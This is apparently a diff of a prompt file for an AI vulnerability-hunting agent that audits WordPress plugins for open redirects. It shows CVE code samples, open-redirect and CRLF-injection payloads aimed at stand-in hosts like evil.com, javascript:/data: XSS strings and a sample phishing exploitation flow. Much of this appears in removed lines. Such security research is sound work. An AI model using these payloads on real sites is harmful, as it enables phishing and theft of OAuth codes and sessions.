@@ -154,23 +154,6 @@ continue, callback_url, success_url, error_url, cancel_url, back_url
 
 ## Real-World CVE Patterns
 
-### CVE-2021-25074: WebP Converter for Media — Standalone Passthru File Redirect
-**Impact:** Unauthenticated, CVSS 6.1
-
-```php
-// passthru.php — standalone file outside WordPress routing
-$image_url = $_GET['src'];
-if (!filter_var($image_url, FILTER_VALIDATE_URL)) {
-    $this->load_image_default($image_url);  // header('Location: ' . $image_url)
-}
-$this->load_converted_image($image_url);
-// Logic flaw: valid URLs SKIP the elseif, fall through to load_converted_image,
-// then redirect to attacker URL when no WebP version exists
-```
-
-**Why vulnerable:** `FILTER_VALIDATE_URL` validates URL *format* but allows any host. Standalone PHP file can't use `wp_safe_redirect()`. Logic flaw means valid external URLs bypass the intended branch.
-**Detection:** `grep -rn "header.*Location.*\$_GET\|header.*Location.*\$_POST" --include='*.php'` + look for standalone PHP files (passthru, proxy, callback)
-
 ### CVE-2024-8761: Share This Image — Two-Stage DB-Stored Redirect
 **Impact:** Unauthenticated, CVSS 7.2
 
@@ -188,96 +171,15 @@ exit();
 **Why vulnerable:** URL stored in DB via unauthenticated AJAX with zero validation, then `wp_redirect()` (not `wp_safe_redirect()`) used on retrieval. Fix: changed to `wp_safe_redirect()`.
 **Detection:** Find AJAX handlers that store URLs (`wp_ajax_nopriv_.*` + `$wpdb->insert.*link\|url`) then trace where stored URLs are used in redirects.
 
-### CVE-2024-0250: Analytics Insights — OAuth State Parameter as Redirect URL
-**Impact:** Unauthenticated, CVSS 6.1
-
-```php
-// tools/oauth2callback.php — standalone OAuth callback
-session_start();
-if ($_GET['state'] && $_GET['code']) {
-    $redirect_uri = $_GET['state'] . '&aiwp_access_code=' . $_GET['code'];
-    header('Location: ' . filter_var($redirect_uri, FILTER_SANITIZE_URL));
-}
-// state=https://evil.com/steal → leaks OAuth code to attacker
-```
-
-**Why vulnerable:** OAuth `state` parameter used as redirect URL instead of CSRF token. `FILTER_SANITIZE_URL` strips illegal chars but allows any host. Fix: deleted standalone file, used nonce-based state within WordPress admin context.
-**Detection:** `find . -name '*oauth*' -o -name '*callback*' | grep '\.php$'` + check if `$_GET['state']` flows into `header('Location')` or `wp_redirect()`
+**Also study:** CVE-2021-25074 (WebP Converter — standalone passthru.php with FILTER_VALIDATE_URL bypass), CVE-2024-0250 (Analytics Insights — OAuth state parameter used as redirect URL in standalone callback file).
 
 ---
 
 ## Attack Techniques
 
-### 1. Basic Open Redirect
-```
-# Direct external URL
-?redirect_to=https://evil.com
-
-# Protocol-relative (bypasses http/https checks)
-?redirect_to=//evil.com
-
-# With path to look legitimate
-?redirect_to=https://evil.com/login?site=legit.com
-```
-
-### 2. URL Validation Bypasses
-```
-# Authentication in URL (userinfo)
-?redirect_to=https://legit.com@evil.com
-
-# Subdomain trick
-?redirect_to=https://legit.com.evil.com
-
-# Backslash confusion (some parsers treat \ as /)
-?redirect_to=https://legit.com\@evil.com
-
-# Null byte (older systems)
-?redirect_to=https://legit.com%00.evil.com
-
-# URL encoding
-?redirect_to=https://%65%76%69%6c.com
-
-# Double encoding
-?redirect_to=https://%2565%2576%2569%256c.com
-
-# Scheme tricks
-?redirect_to=javascript:alert(1)  // If used in href/location without scheme check
-?redirect_to=data:text/html,<script>alert(1)</script>
-```
-
-### 3. WordPress-Specific Bypasses
-```php
-// wp_validate_redirect checks against allowed_redirect_hosts filter
-// If a plugin adds external hosts to the allowlist:
-add_filter('allowed_redirect_hosts', function($hosts) {
-    $hosts[] = 'partner.com';   // Now redirects to partner.com are allowed
-    $hosts[] = '*.partner.com'; // Wildcard — attacker registers sub.partner.com?
-    return $hosts;
-});
-
-// wp_safe_redirect falls back to wp_validate_redirect
-// Check if the fallback URL itself is controllable
-wp_safe_redirect($url, 302, 'Plugin');  // If $url is invalid, redirects to admin_url()
-```
-
-### 4. Header Injection via Redirect
-```
-# CRLF injection in redirect URL (if not sanitized)
-?redirect_to=http://legit.com%0d%0aSet-Cookie:%20admin=true
-?redirect_to=http://legit.com%0d%0a%0d%0a<script>alert(1)</script>
-```
-
-### 5. OAuth/Login Flow Redirect
-```
-# Manipulate OAuth callback
-?redirect_uri=https://evil.com/callback
-
-# After login redirect
-/wp-login.php?redirect_to=https://evil.com
-
-# After logout redirect
-/wp-login.php?action=logout&redirect_to=https://evil.com&_wpnonce=NONCE
-```
+Standard redirect bypass payloads (protocol-relative `//evil.com`, auth-in-URL `@evil.com`, subdomain confusion, CRLF injection) apply.
+Also check `allowed_redirect_hosts` filter additions and OAuth state parameter misuse.
+See "Never Give Up Techniques" and "Patterns to Hunt" above for specific payloads and detection patterns.
 
 ---
 
@@ -333,22 +235,6 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -356,37 +242,16 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="open_redirect",
     title="Open Redirect via redirect_to Parameter in Login Flow",
-    description="""
-## Vulnerability Summary
+    description="""## Vulnerability Summary
 User-controlled redirect_to parameter passed to wp_redirect() without validation.
 
 ## Data Flow
-Entry: GET parameter 'redirect_to' on login page
-  ↓
-Input: $_GET['redirect_to']
-  ↓
-Processing: esc_url_raw($_GET['redirect_to']) — sanitizes format but NOT destination
-  ↓
-Sink: wp_redirect($redirect_to)
-  ↓
-Impact: User redirected to attacker-controlled URL after login
-
-## Prerequisites
-None — works with default plugin settings.
+Entry: GET 'redirect_to' → $_GET['redirect_to'] → esc_url_raw() (format only) → wp_redirect() → 3xx to attacker URL
 
 ## Exploitation
-1. Craft URL: /wp-login.php?redirect_to=https://evil.com/phishing
-2. Send to victim
-3. Victim logs in normally
-4. After login, victim is redirected to attacker's phishing page
-5. Phishing page mimics the real site, captures credentials or session
-
-## Impact
-- Phishing attacks with legitimate-looking URLs
-- OAuth token theft
-- Session fixation
-- Social engineering amplifier
-    """,
+1. Craft: /wp-login.php?redirect_to=https://evil.com/phishing
+2. Victim logs in → redirected to attacker phishing page
+""",
     auth_level="unauthenticated",
     cvss_score=4.7,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
@@ -411,71 +276,4 @@ Open redirect via header injection (CRLF): 6.1 Medium (also report as separate v
 
 ---
 
----
-
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., response has Location header pointing to attacker-controlled URL, 3xx redirect to external domain)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=response has Location header pointing to attacker-controlled URL, 3xx redirect to external domain}}
